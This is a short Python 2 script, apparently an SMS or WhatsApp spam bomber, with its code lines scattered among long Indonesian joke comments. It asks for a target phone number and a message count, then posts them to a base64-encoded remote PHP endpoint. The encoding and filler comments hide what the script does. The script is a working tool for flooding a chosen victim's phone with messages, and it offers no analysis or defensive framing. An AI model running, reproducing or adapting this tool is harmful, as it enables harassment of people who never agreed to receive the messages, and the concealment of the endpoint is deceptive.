import os,sys,requests,base64
# Setelah saya baca, saya
 ## pahami, dan saya hayati
 ## kata-kata di wall anda, maka
 ## saya dapat
 ## menyimpulkan bahwa, kata
 ## kata di status anda
 ## begitu kondusif, bersih dari
 ## sifat yang negatif
 ## sehingga bisa dimengerti oleh
 ## sebagian pihak,
 ##  sahabat, teman dan guru
 ## bahasa indonesia, terkecuali
 ## oleh orang yang memang tidak
 ## bisa
 ## membaca. Status anda
 ## memang sungguh sangat
 ## relevan, singkat, padat,
 ## bermakna, dan status anda
 ## sangat mudah dicerna karna
 ## kata katanya bisa
 ## dimengerti.
 ## Status anda sangat orisinil,
 ## jauh dari kata kata yang
 ## menyimpang,
 ## karena..memang tak
 ## ada persimpangan.
 ## Kata kata yang anda buat
 ## memang sangat
 ## akurat, singkat, padat dan
 ## mantap. Didalam status
 ## anda ini, saya tak akan
 ## mengomentari secara
 ## panjang lebar, karena
 ## komentar yang sangat panjang
 ## dan lebar itu bisa bikin saya
 ## capek, pusing,
 ## bingung dan menyita waktu
 ## untuk mengetiknya.
 ## anda juga akan lelah, karena
 ## sampai detik ini anda
 ## belum juga selesai untuk
 ## membacanya. Tapi,
 ## walaupun begitu, menurut
 ## saya.. pekerjaan yang
 ## dilakukan setengah setengah,
 ## bisa menimbulkan rasa
 ## penasaran, dan membuat
 ## pikiran jadi tak
 ## menentu atau tak tenang, dan
 ## apabila seseorang
 ## meninggal dalam keadaan tak
 ## tenang maka
 ## arwahnya akan penasaran dan
 ## gentayangan. Begitu
 ## juga dengan saya, walau jemari
 ## ini terasa letih,
 ## namun saya tetap ingin
 ## mengomentari status anda
os.system('figlet SpamW')
 ## yang begitu sangat bearti.
 ## Sebelum komentar ini
 ## saya sudahi ada baiknya saya
 ## ingin katakan sepata
 ## kata lagi bahwa, status yang
 ## tlah anda buat ini
 ## adalah status yang
 ## dominan,begitu sopan dan
 ## menyenangkan. Begitu banyak
 ## status yang tlah saya
 ## baca dan saya komentari tapi
 ## baru kali ini saya akui bahwa
 ## status
 ## anda bukan seperti status
 ## palsu yang ada didalam
 ## album lagu. perlu anda
 ## ketahui: untuk apa sih
 ## sebenarnya kita bikin status
 ## palsu kalau itu tak ada
 ## untungnya sama sekali ?
 ## Memang di zaman sekarang
 ## ini, orang jujur itu terlalu sulit
 ## didapati dan dicari. Ada juga
os.system('date')
 ## yang bilang kalau jujur itu
 ## dilarang! Kalau di
 ## dalam judi prinsip seperti itu
 ## memang benat tetapi
 ## kalau di kehidupan seharihari
 ## itu benar-benar
 ## bertentangan.
 ## Ada juga yang bilang jujur tak
 ## makan! padahal,
 ## kejujuran itu adalah kunci
 ## kehidupan. soal makan tak
 ## makan itu kan kita sendiri
 ## yang rasakan. Percuma TUHAN
 ## memberi kita akal
 ## dan pikiran serta tenaga kalau
 ## itu tak akan kita
 ## manfaatkan. Oleh karana itu
 ## marilah kita bersama
 ## sama, saling ingat
 ## mengingatkan
 ## bahwasannya..hidup di DUNIA
 ## ini adalah untuk sementara.
 ## Loh!! kenapa saya jadi
 ## kasih ceramah..
 ## tapi ya sudahlah,
 ## mudah mudahan segala ini
 ## dapat berguna bagi saya,
print('=============================')

 ## anda dan kita semua.
 ## Menindak lanjuti dengan status
 ## anda ini maka dengan
 ## kesadaran diri, dan tanpa
 ## dipaksa oleh pihak manapun
 ## maka dengan ini, saya yang
 ## bernama Willyanto Lim
 ## menyatakan bahwa,
 ## dengan kesungguhan niat dan
 ## tanpa mengada ada,
 ## neko neko, serta nyeleneh
 ## atau dalam bahasa
 ## apapun yang sifatnya dapat
 ## merugikan, provokator
 ## dan kotor seperti koruptor
 ## sehingga dapat
 ## merugikan bangsa, negara dan
 ## orang orang yang tak punya.
 ## Karena, sesungguhnya
 ## koruptor itu tak
 ## jauh
 ## berbeda dari orang yang
 ## korupsi, dari kalangan
 ## orang yang bermobil mewah
 ## hingga rakyat jelata.
 ## Sebagai warga negara yang
 ## berpedoman pada
 ## PANCASILA apakah pantas
 ## korupsi dan koruptor itu
 ## tinggal di bumi NUSANTARA
 ## ini.? sebelum saya akhiri
 ## komentar saya ini, sekali lagi
 ## saya tegaskan bahwa,
 ## saya sangat MENYUKAI
 ## STATUS ANDA maafkan
 ## kalau komentar saya yang
 ## begitu sangat
 ## singkat ini kurang berkenan
 ## dihati anda, karena
 ## saya adalah manusia biasa
A = raw_input('[?] Nomer Target : ')
 ## yang tak mempunyai daya
 ## upaya dan tak pandai dalam
 ## mengukir kata
 ## kata, akan tetapi, walaupun
 ## saya tak bisa berkata
 ## yang indah indah namun bagi
 ## saya itu wajar.
 ## Percuma kalau saya
 ## berkomentar panjang lebar
 ## hasilnya dapat
 ## menimbulkan kata kata yang
 ## berlebihan ( LEBAY ). Akhirnya
 ## setelah saya menyimpulkan
 ## dengan kesungguhan hati,
 ## dengan ini saya
 ## putuskan bahwa SAYA
 ## SANGAT MENYUKAI STATUS
 ## ANDA, dan untuk lebih
 ## meyakinkan lagi,
 ## sesungguhnya SAYA SANGAT
 ## MENYUKAI STTUS
 ## ANDA, karena.. SAYA
 ## MEMANG SANGAT MENYUKAI
 ## STATUS ANDA
 ## 
 ## Komentar Panjang Kedua :
 ## 
 ## misi ya ,,,,gue juga mau komentar,nih.. gak panjang koq tenang ajaa,
 ## saya sudah insaf komentar panjang lebar yang gak bermutu begitu
B = raw_input('[?] Jumlah Paket : ')
 ## lagipula cape komentar panjang lebar yang gak ada maksudnya dan gak penting banget kalo dibaca terus dan sering membuat kita marah, kesel, dan bisa membuat naik darah, tenang aja komentar saya ini gak panjang dan gak lebar juga yang akan membuat anda marah dan kesal dengan komentar yang banyak basa-basi seperti komentar tetangga sebelah yang sering membuat anda marah dan juga kesal.
 ## Padahal komentarnya juga gak ada maksud apa-apa dan agak gak bermutu, oleh sebab itu saya mengomentari status anda tidak panjang dan juga tidak lebar yang akan membuat anda marah dan kesal atas komentar saya ini ##
try:
 print(requests.post(base64.b64decode('aHR0cDovL2dyYXRpei4wMDB3ZWJob3N0YXBwLmNvbS9TcGFtL1NwYW0vU1dBLnBocA=='),data={'nohp':A, 'jumlah':B}).text)
except(ImportError):
 exit()# padahal saya bermaksud baik kepada anda agar anda tidak merasa marah dan kesal atas komentar saya yang tidak panjang dan lebar ini karna saya tahu anda pasti marah dan kesal dengan komentar yang saya berikan ini, padahal saya hanya mengingatkan anda.. karna saya pernah mendengar kata-kata dari kakek saya yaitu berbicara panjang dan lebar, membuat orang lain marah dan kesal maka dari itu saya membuat komentar yang tidak panjang dan tentu tidak lebar seperti tetangga sebelah,.. dan saudara saya juga pernah mengatakan berbicara panjang dan lebar itu tidak baik maka dari itu saya mengingatkan anda kembali agar ketika anda berkomentar tidak panjang dan lebar yang berisi basa-basi yang gak bermutu karna bisa membuat orang lain marah dan kesal pada anda dan mungkin anda akan dipringati oleh orang lain yang melihat komentar anda yang panjang dan juga lebar mungkin komentar saya ini tidak panjang dan tidak lebar-lebar yang bisa menutupi bola bumi dan mungkin juga bisa untuk membuat jalur jalan TOL yang bisa dilewati oleh orang-orang dan terkadang bisa macet ditengah jalan yang akan membuat semua orang marah dan kesal, pasti anda akan merasa pusing dengan kemacetan jalan TOL, terutama bagi pengendara mobil yang sering memasuki jalan TOL.. karna sepeda motor tidak boleh dan tidak bisa masuk jalan TOL mungkin, dan akhirnya sampai juga dirumah dan membuka facebook dan update status yang saya komentari dengan tidak panjang dan tidak lebar, karna jika saya berbicara panjang dan lebar tentu anda akan merasa kebingungan. Okey.
 ## 
 ## Komentar Panjang Ketiga :
 ## 
 ## SAYA DAN SEGENAP
 ## POLRI
 ## TNI AU
 ## TNI AD
 ## TNI AL
 
 ## Presiden
 ## Wakil Presiden
 ## Menteri Agama
 ## Menteri Badan Usaha Milik Negara
 ## Menteri Pertahanan
 ## Menteri Dalam Negeri
 ## Menteri Hukum dan Hak Asasi Manusia
 ## Menteri Kebudayaan dan Pariwisata
 ## Menteri Kehutanan
 ## Menteri Energi dan Sumber Daya Mineral
 ## Menteri Kelautan dan Perikanan
 ## Menteri Kesehatan
 ## Menteri Koordinator Bidang Kesejahteraan Rakyat
 ## Menteri Keuangan
 ## Menteri Keuangan
 ## Menteri Komunikasi dan Informatika
 ## Menteri Koperasi dan Usaha Kecil dan Menengah
 ## Menteri Lingkungan Hidup
 ## Menteri Luar Negeri
 ## Menteri Pekerjaan Umum
 ## Menteri Pembangunan Daerah Tertinggal
 ## Menteri Pemberdayaan Perempuan dan Perlindungan Anak
 ## Menteri Pemuda dan Olahraga
 ## Menteri Pendayagunaan Aparatur Negara dan Reformasi Birokrasi
 ## Menteri Pendidikan Nasional
 ## Menteri Perdagangan
 ## Menteri Koordinator Bidang Perekonomian
 ## Kepala Badan Perencanaan Pembangunan Nasional
 ## Menteri Perhubungan
 ## Menteri Perindustrian
 ## Menteri Pertahanan Republik
 ## Menteri Pertanian
 ## Menteri Perumahan Rakyat
 ## Menteri Koordinator Bidang Politik, Hukum, dan Keamanan
 ## Menteri Riset dan Teknologi
 ## Menteri Sekretaris Negara
 ## Menteri Sosial
 ## Menteri Tenaga Kerja dan Transmigrasi #
